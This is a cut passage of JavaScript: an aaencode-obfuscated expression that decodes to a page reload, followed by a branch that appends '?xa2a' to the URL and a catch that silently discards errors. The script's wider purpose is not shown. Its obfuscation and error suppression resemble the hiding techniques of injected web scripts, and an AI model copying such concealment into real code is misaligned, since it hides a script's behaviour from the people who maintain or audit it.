ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟｰﾟ + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (ﾟｰﾟ + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + ﾟｰﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + (ﾟｰﾟ + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (ﾟｰﾟ + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ﾟｰﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + (ﾟｰﾟ + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + (o ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟｰﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + (ﾟｰﾟ + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ((o ^ _ ^ o) - ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + ﾟｰﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + (ﾟｰﾟ + ﾟΘﾟ) + (ﾟｰﾟ + (o ^ _ ^ o)) + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + ﾟΘﾟ + ﾟｰﾟ + ﾟｰﾟ + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + (c ^ _ ^ o) + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + (o ^ _ ^ o)) + (o ^ _ ^ o) + ﾟДﾟ[ﾟoﾟ])(ﾟΘﾟ))(ﾟΘﾟ + ﾟДﾟ[ﾟεﾟ] + (ﾟｰﾟ + ﾟΘﾟ) + ﾟΘﾟ + ﾟДﾟ[ﾟoﾟ]);
    } else {
      if (window.location.href.indexOf('xa2a') !== -1) {
        window.location.href += '?xa2a';
      }
    }
  }).catch(error => {});
});